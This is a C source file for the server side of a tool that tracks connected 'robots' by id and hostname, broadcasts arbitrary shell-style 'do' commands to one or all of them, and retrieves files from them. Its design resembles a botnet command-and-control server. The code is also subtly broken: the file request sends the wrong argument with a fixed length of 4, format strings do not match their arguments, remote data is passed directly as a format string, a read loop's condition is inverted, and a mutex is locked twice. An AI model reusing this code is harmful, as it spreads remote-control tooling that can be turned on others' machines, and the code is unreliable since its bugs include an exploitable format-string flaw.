#include "server_actions.h"

static int get_robot_id(unsigned int *id, int argc, char* argv[]);

static void robot_send_cmd_handler(void **values);
static void robot_send_cmd(robot* r, char **argv);
static void robot_recv_file(robot* r, const char *source, const char *dest);
static void robot_show(robot *r, void *unused);
static void robot_error_remove(robot* r);
static void robot_close(robot *r);

// -- Actions
// Show informations about all the robots, or a specified robot
void action_robots_show(int argc, char* argv[]) {
	
	unsigned int id = 0;
	
	if(argc > 0) {
		if(get_robot_id(&id, argc, argv))
			return; // No ID
	}
	
    pthread_mutex_lock(&robot_mutex);
	if(!id) {
		printw("[i] Robots connected : \n");
		list_each(&robots, NULL, (void (*)(void *, void *))robot_show);
		printw("[i] ------------------ \n");
	} else {
		robot* r = list_find(&robots, &id, (int (*)(void *, void *))robot_search_id);
		if(!r) {
			printw("[x] Error : no robot with id %d found\n", id);
		} else {
			printw("[i] Robot %d : \n", id);
			printw("[i] id : %d \n", r->id);
			printw("[i] hostname : %s \n", r->hostname);
			printw("[i] ------------------ \n");
		}
	}
    pthread_mutex_unlock(&robot_mutex);
}

// Get a file from the server
void action_robots_rcv_file(int argc, char **argv) {
	unsigned int id = 0;
	
	if(argc < 3) {
		printw("[x] Not enough arguments provided\n");
		printw("[i] Usage : get [id] [source] [destination]\n");
		return;
	}
	
	if(get_robot_id(&id, argc, argv))
		return; // No ID
	
	if(!id) {
		printw("[i] File donwload is not possible for all clients, please specify an ID\n");
	} else {
    	pthread_mutex_lock(&robot_mutex);
		robot* r = list_find(&robots, &id, (int (*)(void *, void *))robot_search_id);
		
		if(!r)
			printw("[x] Error : no robot with id %d found\n", id);
		else
			robot_recv_file(r, argv[1], argv[2]);
			
    	pthread_mutex_unlock(&robot_mutex);
	}
}

// Close a specified robot, or all
void action_robots_close(int argc, char **argv) {
	unsigned int id = 0;
	
	if(get_robot_id(&id, argc, argv))
		return; // No ID
	
    pthread_mutex_lock(&robot_mutex);
	if(!id) {
		printw("[i] Closing all robots\n");
		list_each(&robots, NULL, (void (*)(void *, void *))robot_close);
	} else {
		robot* r = list_find(&robots, &id, (int (*)(void *, void *))robot_search_id);
		if(!r) {
			printw("[x] Error : no robot with id %d found\n", id);
		} else {
			printw("[i] Closing robot %s (%d)\n", r->hostname, r->id);
			robot_close(r);
		}
	}
    pthread_mutex_unlock(&robot_mutex);
}

// Send a specified command to all the robots, or to a specified robot
void action_robots_send_cmd(int argc, char **argv) {
	
	unsigned int id = 0;
	
	if(argc < 2) {
		printw("[x] Error : not enough arguments sended\n");
		return;
	}
	
	if(get_robot_id(&id, argc, argv))
		return; // No ID
	
	printw("[i] Sending command(s)...\n");
	refresh();
			
    pthread_mutex_lock(&robot_mutex);
	if(id) {
		robot* r = list_find(&robots, &id, (int (*)(void *, void *))robot_search_id);
		
		if(!r)
			printw("[x] Error : no robot with id %d found\n", id);
		else
			robot_send_cmd(r, argv + 1);
	} else {
		if(robots.length > 0)
			list_each(&robots, argv + 1, (void (*)(void *, void *))robot_send_cmd);
		else
			printw("[x] Error : no robots connected\n");
	}
    pthread_mutex_unlock(&robot_mutex);
	worker_join(&action_pool);
}

// -- Handlers
// Get from the first argument the ID. Return 0 if the ID is valid, 1 otherwise
static int get_robot_id(unsigned int *id, int argc, char* argv[]) {
	
	if(argc >= 1) {
		if(strcmp("all", argv[0])) {
			*id = atoi(argv[0]);
			
			if(!(*id)) {
				printw("[x] Error : Invalid ID\n");
				return 1;
			}
			
			return 0; // Specified
		} else
			return 0; // All
	}
	
	printw("[x] Error : No ID provided\n");
	return 1; // Error
}

// Close a connection and delete the robot
static void robot_close(robot *r) {
	//  Try to say goodbye
	send(r->sock, "goodbye\n", 8, MSG_NOSIGNAL);
	
	// Close & free
	close(r->sock);
	list_remove(&robots, &(r->id), (int (*)(void *, void *))robot_search_id, free);
}

// Show informations about a given robot
static void robot_show(robot *r, void *unused) {
	printw("[>] %i > %s\n", r->id, r->hostname);
}

// Send the given action to the given robot, using the worker pool
static void robot_send_cmd(robot* r, char **argv) {
	
	action a;
	void** values = malloc(sizeof(void*) * 2);
	
	values[0] = r;
	values[1] = argv;
	
	a.perform = (worker_action) robot_send_cmd_handler;
	a.args = (void*) values;

	worker_add(&action_pool, &a);
}

// Send the given action to the given robot
static void robot_send_cmd_handler(void **values) {
	robot *r = (robot*) values[0];
	char **argv = (char**) values[1];
	char buf[512] = {0};
	int i = 0;
	
	free(values);
	
	// Send all the part of the arguments
	if(send(r->sock, "do", 2, MSG_MORE|MSG_NOSIGNAL) <= 0)
		goto error;
	
	while(argv[i]) {
		if(send(r->sock, " ", 1, MSG_MORE|MSG_NOSIGNAL) <= 0)
			goto error;
				
		if(send(r->sock, argv[i], strlen(argv[i]), MSG_MORE|MSG_NOSIGNAL) <= 0)
			goto error;
		
		i++;
	}
	
	if(send(r->sock, "\n", 1, MSG_EOR|MSG_NOSIGNAL) <= 0)
		goto error;
	
	// Read the response 'done'
	if(read(r->sock, buf, 512) <= 0)
		goto error;
	
	return;
	
	error:
		robot_error_remove(r);
}

static void robot_recv_file(robot* r, const char *source, const char *dest) {
	
	// Try to open the destination file
	FILE* f = fopen(dest, "w");
	char buf[NET_BUFFER_SIZE] = {0};
	int n = 0;
	
	if(!f) {
		printw("[x] An error occured with the local file %s : %s\n", r->hostname, r->id, strerror(errno));
		return;
	}
	
	// Send the command
	if(send(r->sock, "get ", 4, MSG_MORE|MSG_NOSIGNAL) <= 0)
		goto error;
	
	if(send(r->sock, dest, 4, MSG_EOR|MSG_NOSIGNAL) <= 0)
		goto error;
	
	// Read response
	if((n = read(r->sock, buf, NET_BUFFER_SIZE - 1)) <= 0)
		goto error;
	buf[n] = '\0';
	
	printw(buf);
	
	if(strncmp(buf, "got it\n", 7)) {
		// An error occured
		printw("[x] Error with %s (%d) : %s\n", r->hostname, r->id, buf);
		goto end;
	}
	
	// Get the file content
	if(fwrite(buf + 7, n - 7, 1, f) != n) {
		printw("[x] An error occured with the local file %s : %s\n", r->hostname, r->id, strerror(errno));
		goto end;
	}

	while((n = read(r->sock, buf, NET_BUFFER_SIZE)) <= 0) {
		printw("[i] read %d bytes\n", n);
		if(fwrite(buf, n, 1, f) != n) {
			printw("[x] An error occured with the local file %s : %s\n", r->hostname, r->id, strerror(errno));
			goto end;
		}
		
		if(n < 0)
			goto error;
		else if(n < NET_BUFFER_SIZE)
			break; // Finished
	}
	
		
	end:
		fclose(f);
		return;
		
	error:
		robot_error_remove(r);
		goto end;
}

static void robot_error_remove(robot* r) {
	printw("[x] An error occured with %s (%d) : %s\n", r->hostname, r->id, strerror(errno));
	refresh();
	
	pthread_mutex_lock(&robot_mutex);
	list_remove(&robots, &(r->id), (int (*)(void *, void *))robot_search_id, free);
	pthread_mutex_unlock(&robot_mutex);
}
